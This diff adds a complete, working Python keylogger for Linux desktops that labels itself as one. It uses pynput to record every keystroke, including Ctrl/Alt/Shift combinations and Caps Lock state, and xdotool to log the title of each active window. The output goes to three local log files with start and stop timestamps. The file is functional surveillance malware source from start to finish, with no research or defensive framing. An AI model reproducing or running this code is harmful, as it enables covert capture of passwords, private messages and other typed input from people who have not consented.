@@ -1,0 +1,203 @@
+#!/usr/bin/env python
+
+import subprocess
+import datetime
+import argparse
+from pynput import keyboard
+import signal
+from pynput.keyboard import Key, Listener, KeyCode
+from Xlib import display
+
+
+def is_capslock_on():
+    d = display.Display()
+    return d.get_keyboard_control().led_mask & 1 != 0
+
+def get_active_window():
+    try:
+        window_id = subprocess.check_output(['xdotool', 'getactivewindow'], stderr=subprocess.DEVNULL).strip()
+        window_name = subprocess.check_output(['xdotool', 'getwindowname', window_id], stderr=subprocess.DEVNULL).decode('utf-8').strip()
+
+        if window_name:
+            parts = window_name.split(' — ')
+            if len(parts) > 1:
+                app_name = parts[-1]
+            else:
+                parts = window_name.split(' - ')
+                app_name = parts[-1] if len(parts) > 1 else window_name
+
+            return app_name.strip()
+        else:
+            pass
+    except Exception as e:
+        pass
+
+def on_press(key):
+    global current_window, keys_held, shift_held, last_char, modifiers_held, ctrl_pressed,shift_pressed,alt_pressed,caps_pressed
+    last_char = ""
+    shift=""    
+    ctrl=""
+    alt=""
+    new_window = get_active_window()
+
+    # Log window change
+    if (new_window != current_window) and (new_window is not None):
+        current_window = new_window
+        write_to_file(log_file, f"\n{COLOR_APP_TITLE}[{current_window}]{COLOR_RESET} - ")
+        write_to_file(log_file_not_formatted, f"\n[{current_window}] - ")
+        write_to_file(log_file_only_text, f"\n[{current_window}] - ")
+
+    # Track shift key
+    if key in [Key.shift, Key.shift_r]:
+        shift_pressed = True
+        shift_held = True
+
+    # Track modifier keys and add them to the set
+    if key in [Key.ctrl, Key.ctrl_l, Key.ctrl_r]:
+        ctrl_pressed = True
+        modifiers_held.add(key)
+
+    if key in [Key.alt, Key.alt_r]:
+        alt_pressed = True
+    
+    if key in [Key.caps_lock]:
+            caps_pressed = True
+      
+    txt=""    
+    # Handle character keys
+    try:      
+        if (key.char):
+            capslock_on = is_capslock_on()
+            if capslock_on and not shift_pressed:
+                txt = key.char.upper()
+            elif shift_pressed and not capslock_on:
+                txt = key.char.upper()
+            else:
+                txt = key.char.lower()
+                
+            if shift_pressed and not ctrl_pressed and not alt_pressed:
+                write_to_file(log_file, f"{txt}")
+                write_to_file(log_file_not_formatted, f"{txt}")
+                shift_pressed = False
+                return  # Exit to prevent double logging of the character
+
+            if ctrl_pressed or shift_pressed or alt_pressed:
+                if ctrl_pressed:
+                    ctrl = "CTRL+"
+                if shift_pressed:
+                    shift = "SHIFT+"
+                if alt_pressed:
+                    alt = "ALT+"
+            
+                write_to_file(log_file, f"{COLOR_KEYBINDING} [{ctrl}{alt}{shift}{key.char.upper()}] {COLOR_RESET}")
+                write_to_file(log_file_not_formatted, f"[{ctrl}{alt}{shift}{key.char.upper()}] ")
+                shift_pressed = False  # Reset shift_pressed here to ensure next press is handled normally
+                ctrl_pressed = False
+                alt_pressed = False
+                return  # Exit to prevent double logging of the character  
+            
+            elif not(ctrl_pressed or shift_pressed or alt_pressed or caps_pressed or alt_pressed):
+                write_to_file(log_file, f"{txt}")
+                write_to_file(log_file_not_formatted, f"{txt}")
+                write_to_file(log_file_only_text, f"{txt}")
+                return
+                       
+    except AttributeError:
+        pass
+
+    if not (ctrl_pressed or shift_pressed or alt_pressed or caps_pressed):
+                if key == Key.space:
+                    write_to_file(log_file, " ")
+                    write_to_file(log_file_not_formatted, " ")
+                    write_to_file(log_file_only_text, " ")
+
+                elif key == Key.enter:
+                    write_to_file(log_file, f"{COLOR_KEYBINDING} [ENTER] {COLOR_RESET}\n")
+                    write_to_file(log_file_not_formatted, " [ENTER] \n")
+                    write_to_file(log_file_only_text, "\n")
+
+                else:
+                        key_formatted = str(key).replace("Key.", "").upper() # key written as is key.esc  i want only the esc
+                        write_to_file(log_file, f"{COLOR_KEYBINDING} [{key_formatted}] {COLOR_RESET} ")
+                        write_to_file(log_file_not_formatted, f" [{str(key)}] ")
+
+def on_release(key):
+    global shift_held, keys_held, modifiers_held, last_char, ctrl_pressed, shift_pressed, alt_pressed,caps_pressed
+    # Reset specific modifiers when their key is released
+    if key in [Key.caps_lock]:
+         caps_pressed=False
+    if key in [Key.ctrl, Key.ctrl_l, Key.ctrl_r]:
+        ctrl_pressed = False
+    if key in [Key.alt, Key.alt_r]:
+        alt_pressed = False
+    if key in [Key.shift, Key.shift_r]:
+        shift_pressed = False
+
+    # Remove from the modifiers set
+    modifiers_held.discard(key)
+
+
+def write_to_file(file,text):
+    with open(file, "a") as f:
+      f.write(text)
+      f.flush()
+
+
+parser = argparse.ArgumentParser(description='Keylogger script to log keystrokes and active window titles.')
+parser.add_argument('-l', '--logfile', nargs='?', default='key_log', help='The file to log keystrokes to (default: key_log.txt).')
+args = parser.parse_args()
+
+
+log_file=""
+log_file_not_formatted = ""
+log_file_only_text = ""
+
+log = args.logfile.rsplit('.', 1)[0]
+log_file = f"{log}.txt"
+log_file_not_formatted=f"{log}_not_formatted.txt"
+log_file_only_text=f"{log}_only_text.txt"
+
+with open(log_file, "w") as f:
+        f.write("")
+
+with open(log_file_not_formatted, "w") as f:
+        f.write("")
+ 
+with open(log_file_only_text, "w") as f:
+        f.write("")
+
+print(f"start logging to {log_file}")
+
+
+caps_pressed = False
+shift_pressed=False
+ctrl_pressed=False
+alt_pressed=False
+current_window = None
+keys_held = set()
+shift_held = False
+modifiers_held = set()
+
+COLOR_APP_TITLE = "\033[1;34m"
+COLOR_DATETIME = "\033[1;32m"
+COLOR_KEYBINDING = "\033[1;31m"
+COLOR_RESET = "\033[0m"
+
+current_datetime = datetime.datetime.now()
+current_datetime_str = f"start logging at {current_datetime.strftime('%Y-%m-%d %H:%M:%S')}"
+
+write_to_file(log_file_not_formatted,f"\n{current_datetime_str}\n")
+write_to_file(log_file_only_text,f"\n{current_datetime_str}\n")
+write_to_file(log_file,f"\n{COLOR_DATETIME}{current_datetime_str}{COLOR_RESET}\n")
+
+last=""
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    try:
+        listener.join()
+    except KeyboardInterrupt:
+        stop_current_datetime=f"stop logging at {current_datetime.strftime('%Y-%m-%d %H:%M:%S')}"
+        write_to_file(log_file_only_text,f"\n\n{stop_current_datetime}\n\n")       
+        write_to_file(log_file_not_formatted,f"\n\n{stop_current_datetime}\n\n")
+        write_to_file(log_file,f"\n\n{COLOR_DATETIME}{stop_current_datetime}{COLOR_RESET}\n\n")
+        print("\nKeylogger stopped.")
+        exit(0)
